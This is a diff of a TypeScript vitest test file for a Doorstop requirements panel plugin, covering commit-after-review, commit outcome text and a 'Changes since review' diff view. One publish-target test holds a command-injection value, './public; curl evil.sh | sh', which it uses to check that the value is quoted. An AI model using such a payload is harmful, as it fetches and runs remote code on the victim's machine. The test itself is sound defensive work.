@@ -18,7 +18,7 @@
 import { afterEach, describe, expect, it, vi, type Mock } from "vitest";
 import type { TerminalCommandRun, TerminalCommandRunHandle, Workspace, WorkspacePanelContext } from "@jmfederico/pi-web/plugin-api";
 import type { DoorstopDocumentConfig, DoorstopIndex, ItemRecord, ItemStateKey } from "./doorstop-contract.js";
-import type { DoorstopRunResponse } from "./doorstop-backend-contract.js";
+import type { DoorstopRunResponse, DoorstopBaselineResponse } from "./doorstop-backend-contract.js";
 import { buildDoorstopIndex } from "./doorstop-model.js";
 import { computeItemStamp, computeItemStates } from "./doorstop-state.js";
 import {
@@ -37,6 +37,7 @@ import {
 } from "./doorstop-prompts.js";
 import {
   bodyElementTag,
+  commitOutcomeText,
   defineDoorstopPanelElements,
   documentStateDots,
   doorstopPublishCommand,
@@ -204,6 +205,97 @@ function makeTreeResult(): DoorstopWorkspaceResult {
     "docs/spec.md",
   ]);
   return makeResult([req0001, req0002, tst001, tst002], [reqConfig, tstConfig], [], knownFilePaths);
+}
+
+/** The REQ document config with an extended REVIEWED attribute ("owner") —
+ *  the shape the "Changes since review" tests need so the field diff and the
+ *  stamp both cover it. */
+function makeReviewAttrConfig(): DoorstopDocumentConfig {
+  return makeDocument({
+    directoryPath: "reqs",
+    configPath: "reqs/.doorstop.yml",
+    prefix: "REQ",
+    digits: 4,
+    extra: { attributes: { reviewed: ["owner"] } },
+  });
+}
+
+/** A baseline blob whose parsed item stamps to `item.reviewed`: the item's
+ *  pre-edit content (the reviewed version of the fixture below). Extended
+ *  attributes are TOP-LEVEL item keys (Doorstop's own file shape — the
+ *  model chain's `attributes` bucket is everything not modeled), so they are
+ *  serialized as siblings of text/links, not under an `attributes:` key. */
+function reviewedBlob(item: ItemRecord): string {
+  const lines = [
+    "active: true",
+    "derived: false",
+    "normative: true",
+    `level: ${item.level}`,
+    "text: |-",
+    ...item.text.split("\n").map((line) => `  ${line}`),
+    "links:",
+    ...item.links.map((link) => `- ${link.uid}`),
+    ...Object.entries(item.attributes).map(([key, value]) => `${key}: ${String(value)}`),
+  ];
+  return lines.join("\n");
+}
+
+/** A workspace with ONE edited-after-review item (REQ0003): `reviewed` holds
+ *  the stamp of the reviewed version (parsed from {@link reviewedBlob}), the
+ *  current content diverges (one added line, one added link, owner changed)
+ *  — so the item is unreviewed AND has a recoverable baseline. */
+function makeEditedItemResult(): DoorstopWorkspaceResult {
+  const reqConfig = makeReviewAttrConfig();
+  const tstConfig = makeDocument({
+    directoryPath: "tests",
+    configPath: "tests/.doorstop.yml",
+    prefix: "TST",
+    digits: 3,
+    parentPrefix: "REQ",
+  });
+  const req0001 = makeItem("REQ0001", "REQ", {
+    path: "reqs/REQ0001.yml",
+    level: "1.0",
+    text: "The system shall do X.",
+  });
+  req0001.reviewed = computeItemStamp(req0001, reqConfig, true);
+  const oldVersion = makeItem("REQ0003", "REQ", {
+    path: "reqs/REQ0003.yml",
+    level: "1.2",
+    text: "The system shall do Z.\nAnd approve.",
+    links: [{ uid: "REQ0001", fingerprint: null }],
+    attributes: { owner: "team-a" },
+  });
+  const current = makeItem("REQ0003", "REQ", {
+    path: "reqs/REQ0003.yml",
+    level: "1.2",
+    text: "The system shall do Z.\nAnd approve.\nAsync.",
+    links: [
+      { uid: "REQ0001", fingerprint: null },
+      { uid: "REQ0002", fingerprint: null },
+    ],
+    attributes: { owner: "team-b" },
+  });
+  // `reviewed` is the fingerprint of the REVIEWED (pre-edit) version.
+  current.reviewed = computeItemStamp(oldVersion, reqConfig, true);
+  const req0002 = makeItem("REQ0002", "REQ", {
+    path: "reqs/REQ0002.yml",
+    level: "1.1",
+    text: "The system shall do Y.",
+  });
+  const knownFilePaths = new Set(["reqs/REQ0001.yml", "reqs/REQ0002.yml", "reqs/REQ0003.yml"]);
+  return makeResult([req0001, req0002, current], [reqConfig, tstConfig], [], knownFilePaths);
+}
+
+/** A canned baseline response for the backend spies; callers override only
+ *  the fields their scenario cares about. */
+function makeBaselineResponse(overrides: Partial<DoorstopBaselineResponse> = {}): DoorstopBaselineResponse {
+  return {
+    git: true,
+    source: "review-commit",
+    candidates: [],
+    ...overrides,
+  };
 }
 
 /** Mount the body element over a controller driven by the given job, mirror
@@ -1318,6 +1410,354 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     expect(sectionText).toContain("SIGTERM");
     expect(sectionText).toContain("partial output");
   });
+
+  it("passes commit: true on Review only when the workspace setting is on (omitted under the default)", async () => {
+    // Default setting (off): the review request carries NO commit field.
+    const backendOff = vi.fn((operation: string, input: unknown) => Promise.resolve(makeRunResponse()));
+    const off = await mountBody(() => Promise.resolve(makeEditedItemResult()), { backend: backendOff, provider: opendoorProvider });
+    off.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(off.body, off.controller, off.context);
+    await flush(off.body);
+    off.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
+    await flush(off.body);
+    expect(backendOff).toHaveBeenCalledWith("doorstop.run", { op: "review", uid: "REQ0003" });
+    expect(backendOff.mock.calls[0]?.[1]).not.toHaveProperty("commit");
+
+    // Setting on: the request carries commit: true.
+    const backendOn = vi.fn((operation: string, input: unknown) => Promise.resolve(makeRunResponse()));
+    const on = await mountBody(() => Promise.resolve(makeEditedItemResult()), { backend: backendOn, provider: opendoorProvider });
+    on.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(on.body, on.controller, on.context);
+    await flush(on.body);
+    // Flip the setting on the element's result surface (as a fresh settings
+    // load would); bindBody above already mirrored the controller result, so
+    // the override is what the Review click reads.
+    const onResult = on.body.result;
+    if (onResult !== undefined) {
+      on.body.result = { ...onResult, settings: { ...onResult.settings, commitAfterReview: true } };
+      await flush(on.body);
+    }
+    on.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
+    await flush(on.body);
+    expect(backendOn).toHaveBeenCalledWith("doorstop.run", { op: "review", uid: "REQ0003", commit: true });
+
+    // Backend is the only commit path: with the setting on but NO backend,
+    // the terminal command stays the plain `doorstop review <uid>`.
+    const terminal = await mountBody(() => Promise.resolve(makeEditedItemResult()));
+    terminal.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(terminal.body, terminal.controller, terminal.context);
+    await flush(terminal.body);
+    if (terminal.body.result !== undefined) {
+      terminal.body.result = {
+        ...terminal.body.result,
+        settings: { ...terminal.body.result.settings, commitAfterReview: true },
+      };
+      await flush(terminal.body);
+    }
+    terminal.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
+    await flush(terminal.body);
+    expect(terminal.context.terminal.runCommand).toHaveBeenCalledWith({
+      title: "Doorstop: review REQ0003",
+      command: "doorstop review REQ0003",
+      metadata: { "opendoor.op": "review" },
+      open: false,
+    });
+    expect(terminal.context.terminal.runCommand).toHaveBeenCalledTimes(1);
+  });
+
+  it("renders the commit outcome line in Last run; a failed commit does not flip the ok badge", async () => {
+    const backend = vi.fn(() =>
+      Promise.resolve(
+        makeRunResponse({
+          op: "review",
+          exitCode: 0,
+          stdout: "REQ0003 now reviewed.",
+          commit: { status: "committed", sha: "abc1234" },
+        }),
+      ),
+    );
+    const good = await mountBody(() => Promise.resolve(makeEditedItemResult()), { backend, provider: opendoorProvider });
+    good.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(good.body, good.controller, good.context);
+    await flush(good.body);
+    good.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
+    await flush(good.body);
+    bindBody(good.body, good.controller, good.context);
+    await flush(good.body);
+    const goodRoot = good.body.shadowRoot;
+    expect(goodRoot?.querySelector(".doorstop-last-run-status")?.textContent).toBe("ok");
+    expect(goodRoot?.querySelector(".doorstop-last-run-commit")?.textContent).toBe("commit: abc1234");
+
+    // A failed COMMIT is narration: the review succeeded, so the badge stays
+    // ok while the line surfaces the bounded git stderr.
+    const backendFailed = vi.fn(() =>
+      Promise.resolve(
+        makeRunResponse({
+          op: "review",
+          exitCode: 0,
+          stdout: "REQ0003 now reviewed.",
+          commit: { status: "failed", stderr: "fatal: not a git repository" },
+        }),
+      ),
+    );
+    const failed = await mountBody(() => Promise.resolve(makeEditedItemResult()), { backend: backendFailed, provider: opendoorProvider });
+    failed.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(failed.body, failed.controller, failed.context);
+    await flush(failed.body);
+    failed.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
+    await flush(failed.body);
+    bindBody(failed.body, failed.controller, failed.context);
+    await flush(failed.body);
+    const failedRoot = failed.body.shadowRoot;
+    expect(failedRoot?.querySelector(".doorstop-last-run-status")?.textContent).toBe("ok");
+    expect(failedRoot?.querySelector(".doorstop-last-run-commit")?.textContent).toBe(
+      "commit: failed — fatal: not a git repository",
+    );
+    expect(failed.controller.lastRun?.status).toBe("ok");
+  });
+
+  it("maps every commit outcome status to its narration text (pure)", () => {
+    expect(commitOutcomeText({ status: "committed", sha: "abc1234" })).toBe("commit: abc1234");
+    expect(commitOutcomeText({ status: "clean" })).toBe("commit: clean (already committed)");
+    expect(commitOutcomeText({ status: "skipped" })).toBe(
+      "commit: skipped (not a git repository | review failed | deadline)",
+    );
+    expect(commitOutcomeText({ status: "failed", stderr: "boom" })).toBe("commit: failed — boom");
+  });
+});
+
+describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
+  it("is gated on unreviewed + stored reviewed fingerprint + active backend", async () => {
+    // A REVIEWED item (stamp matches): no section, even with a backend.
+    const reviewedCase = await mountBody(() => Promise.resolve(makeTreeResult()), {
+      backend: vi.fn(),
+      provider: opendoorProvider,
+    });
+    reviewedCase.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
+    bindBody(reviewedCase.body, reviewedCase.controller, reviewedCase.context);
+    await flush(reviewedCase.body);
+    expect(reviewedCase.body.shadowRoot?.querySelector(".doorstop-changes")).toBeNull();
+
+    // Unreviewed WITH a stored fingerprint and an active backend: present.
+    const unpaired = await mountBody(() => Promise.resolve(makeEditedItemResult()));
+    unpaired.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(unpaired.body, unpaired.controller, unpaired.context);
+    await flush(unpaired.body);
+    // No backend (unpaired install): the section is hidden entirely.
+    expect(unpaired.body.shadowRoot?.querySelector(".doorstop-changes")).toBeNull();
+
+    // Same item with the backend active: the section renders (collapsed).
+    const paired = await mountBody(() => Promise.resolve(makeEditedItemResult()), {
+      backend: vi.fn(),
+      provider: opendoorProvider,
+    });
+    paired.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(paired.body, paired.controller, paired.context);
+    await flush(paired.body);
+    const section = paired.body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
+    expect(section).not.toBeNull();
+    expect(section?.open).toBe(false); // collapsed by default
+    expect(section?.querySelector("summary")?.textContent).toBe("Changes since review");
+  });
+
+  it("sends the baseline request on expand; a later expand is a cache hit (exactly one fetch)", async () => {
+    const backend = vi.fn((operation: string) => {
+      if (operation === "doorstop.item-baseline") {
+        return Promise.resolve(makeBaselineResponse({ source: "none", candidates: [] }));
+      }
+      return Promise.resolve(makeRunResponse());
+    });
+    const { body, controller, context } = await mountBody(() => Promise.resolve(makeEditedItemResult()), {
+      backend,
+      provider: opendoorProvider,
+    });
+    body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(body, controller, context);
+    await flush(body);
+
+    const details = body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
+    if (details === undefined || details === null) throw new Error("no changes section");
+    details.open = true;
+    details.dispatchEvent(new Event("toggle"));
+    await flush(body);
+    // One fetch with the exact request (uid + workspace-relative path).
+    const baselineCalls = backend.mock.calls.filter(([op]) => op === "doorstop.item-baseline");
+    expect(baselineCalls).toHaveLength(1);
+    expect(baselineCalls[0]).toEqual(["doorstop.item-baseline", { uid: "REQ0003", path: "reqs/REQ0003.yml" }]);
+
+    // A second expand (collapse then reopen): the cached ready view matches
+    // the current key → no second fetch.
+    details.open = false;
+    details.dispatchEvent(new Event("toggle"));
+    details.open = true;
+    details.dispatchEvent(new Event("toggle"));
+    await flush(body);
+    expect(backend.mock.calls.filter(([op]) => op === "doorstop.item-baseline")).toHaveLength(1);
+  });
+
+  it("stamp-walks the candidates newest-first and renders the semantic diff (text rows + field chips)", async () => {
+    const oldVersion = makeItem("REQ0003", "REQ", {
+      path: "reqs/REQ0003.yml",
+      level: "1.2",
+      text: "The system shall do Z.\nAnd approve.",
+      links: [{ uid: "REQ0001", fingerprint: null }],
+      attributes: { owner: "team-a" },
+    });
+    const backend = vi.fn((operation: string) => {
+      if (operation === "doorstop.item-baseline") {
+        return Promise.resolve(
+          makeBaselineResponse({
+            source: "review-commit",
+            candidates: [
+              // Newest first: this NEWER blob does NOT match `reviewed` (a
+              // different revision), so the walk must skip it and land on
+              // the matching candidate below.
+              { sha: "beef0000", blob: "active: true\nnormative: true\ntext: Different.\n" },
+              { sha: "abc1234", blob: reviewedBlob(oldVersion) },
+            ],
+          }),
+        );
+      }
+      return Promise.resolve(makeRunResponse());
+    });
+    const { body, controller, context } = await mountBody(() => Promise.resolve(makeEditedItemResult()), {
+      backend,
+      provider: opendoorProvider,
+    });
+    body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(body, controller, context);
+    await flush(body);
+    const details = body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
+    if (details === undefined || details === null) throw new Error("no changes section");
+    details.open = true;
+    details.dispatchEvent(new Event("toggle"));
+    await flush(body);
+    bindBody(body, controller, context);
+    await flush(body);
+
+    const root = body.shadowRoot;
+    const sectionText = root?.querySelector(".doorstop-changes")?.textContent ?? "";
+    expect(root?.querySelector(".doorstop-changes-source")?.textContent).toBe("matched via review commit");
+    // Text rows: the one added line (+ Async.), unchanged lines rendered same.
+    const added = root?.querySelectorAll(".doorstop-diff-line.is-added");
+    expect(added?.length).toBe(1);
+    expect(added?.[0]?.textContent).toContain("Async.");
+    const same = root?.querySelectorAll(".doorstop-diff-line.is-same");
+    expect(same?.length).toBe(2);
+    expect(same?.[0]?.textContent).toContain("The system shall do Z.");
+    expect(root?.querySelectorAll(".doorstop-diff-line.is-removed").length).toBe(0);
+    // Field chips: the added link, the removed link (none), the owner change.
+    expect(sectionText).toContain("+ REQ0002");
+    expect(sectionText).toContain("team-a");
+    expect(sectionText).toContain("team-b");
+    expect(root?.querySelectorAll(".doorstop-field-chip-before").length).toBe(1); // owner before
+    expect(root?.querySelectorAll(".doorstop-field-chip-after").length).toBe(2); // owner after + link
+    // No ref/references rows (those fields did not change).
+    expect(sectionText).not.toContain("ref");
+  });
+
+  it("renders the no-match notice when no candidate stamps to the reviewed fingerprint", async () => {
+    const backend = vi.fn((operation: string) => {
+      if (operation === "doorstop.item-baseline") {
+        return Promise.resolve(makeBaselineResponse({ source: "history", candidates: [] }));
+      }
+      return Promise.resolve(makeRunResponse());
+    });
+    const { body, controller, context } = await mountBody(() => Promise.resolve(makeEditedItemResult()), {
+      backend,
+      provider: opendoorProvider,
+    });
+    body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(body, controller, context);
+    await flush(body);
+    const details = body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
+    if (details === undefined || details === null) throw new Error("no changes section");
+    details.open = true;
+    details.dispatchEvent(new Event("toggle"));
+    await flush(body);
+    bindBody(body, controller, context);
+    await flush(body);
+    expect(body.shadowRoot?.querySelector(".doorstop-changes-notice")?.textContent).toBe(
+      "Could not locate the reviewed version (history may have been rewritten)",
+    );
+  });
+
+  it("renders the no-git notice when the backend reports git: false", async () => {
+    const backend = vi.fn((operation: string) => {
+      if (operation === "doorstop.item-baseline") {
+        return Promise.resolve(makeBaselineResponse({ git: false, source: "none", candidates: [] }));
+      }
+      return Promise.resolve(makeRunResponse());
+    });
+    const { body, controller, context } = await mountBody(() => Promise.resolve(makeEditedItemResult()), {
+      backend,
+      provider: opendoorProvider,
+    });
+    body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(body, controller, context);
+    await flush(body);
+    const details = body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
+    if (details === undefined || details === null) throw new Error("no changes section");
+    details.open = true;
+    details.dispatchEvent(new Event("toggle"));
+    await flush(body);
+    bindBody(body, controller, context);
+    await flush(body);
+    expect(body.shadowRoot?.querySelector(".doorstop-changes-notice")?.textContent).toBe(
+      "No git history — previous version unavailable",
+    );
+  });
+
+  it("self-heals an open section after an edit invalidates the cache key (reused <details> fires no toggle)", async () => {
+    const backend = vi.fn((operation: string) => {
+      if (operation === "doorstop.item-baseline") {
+        return Promise.resolve(makeBaselineResponse({ source: "history", candidates: [] }));
+      }
+      return Promise.resolve(makeRunResponse());
+    });
+    const { body, controller, context } = await mountBody(() => Promise.resolve(makeEditedItemResult()), {
+      backend,
+      provider: opendoorProvider,
+    });
+    body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
+    bindBody(body, controller, context);
+    await flush(body);
+    const details = body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
+    if (details === undefined || details === null) throw new Error("no changes section");
+    details.open = true;
+    details.dispatchEvent(new Event("toggle"));
+    await flush(body);
+    bindBody(body, controller, context);
+    await flush(body);
+    // The no-match view is cached under REQ0003's current key.
+    expect(backend.mock.calls.filter(([op]) => op === "doorstop.item-baseline")).toHaveLength(1);
+    expect(body.shadowRoot?.querySelector(".doorstop-changes-notice")?.textContent).toContain(
+      "Could not locate",
+    );
+
+    // An edit lands: the item's stamp changes, so the cached view's key no
+    // longer matches. The host re-renders the pane with the fresh result
+    // (simulated by mirroring then rebinding a new result object) — the
+    // reused <details> stays OPEN and no `toggle` event fires, so only the
+    // post-render self-heal can kick the fetch.
+    const item = controller.result?.index.byUid.get("REQ0003");
+    if (item === undefined) throw new Error("REQ0003 missing");
+    item.text += "\nEdited after review.";
+    bindBody(body, controller, context);
+    body.result = { ...controller.result! };
+    await flush(body);
+    // Still open (node reused, not recreated) — and the fetch happened with
+    // no user action at all.
+    expect(details.open).toBe(true);
+    expect(backend.mock.calls.filter(([op]) => op === "doorstop.item-baseline")).toHaveLength(2);
+    // Mirror the landing (the refetch bumped `baselineVersion`) so the
+    // element re-renders the terminal notice instead of the loading view.
+    bindBody(body, controller, context);
+    await flush(body);
+    expect(body.shadowRoot?.querySelector(".doorstop-changes-notice")?.textContent).toContain(
+      "Could not locate",
+    );
+  });
 });
 
 describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
@@ -1669,7 +2109,7 @@ describe("DoorstopPanelBodyElement (publish target wiring, spec §7.2)", () => {
     // doorstopPublishCommand is the last line of defense and must quote it.
     const bare = body.result;
     if (bare === undefined) throw new Error("no result");
-    body.result = { index: bare.index, settings: { publishTarget: hostile, excludedDirectories: [] } };
+    body.result = { index: bare.index, settings: { publishTarget: hostile, excludedDirectories: [], commitAfterReview: false } };
     await flush(body);
     expect(doorstopPublishTarget(body.result)).toBe(hostile);
     expect(doorstopPublishCommand(body.result)).toBe("doorstop publish all './public; curl evil.sh | sh'");
@@ -1694,7 +2134,7 @@ describe("DoorstopPanelBodyElement (publish target wiring, spec §7.2)", () => {
     const result = makeTreeResult();
     const withTarget = (publishTarget: string): DoorstopWorkspaceResult => ({
       index: result.index,
-      settings: { publishTarget, excludedDirectories: [] },
+      settings: { publishTarget, excludedDirectories: [], commitAfterReview: false },
     });
     // Inert `[\w./-]` targets keep the canonical bare command spelling.
     expect(doorstopPublishCommand(withTarget("./public"))).toBe("doorstop publish all ./public");
@@ -1901,6 +2341,9 @@ function bindBody(
   // Phase D: the run-state fields the Last-run section and button gating read.
   body.lastRun = controller.lastRun;
   body.runInProgress = controller.runInProgress;
+  // Phase D step 15: the baseline-cache state the contributions wiring mirrors.
+  body.baselineVersion = controller.baselineVersion;
+  body.baselineInFlight = controller.baselineInFlight;
 }
 
 async function flush(body: DoorstopPanelBodyElement): Promise<void> {
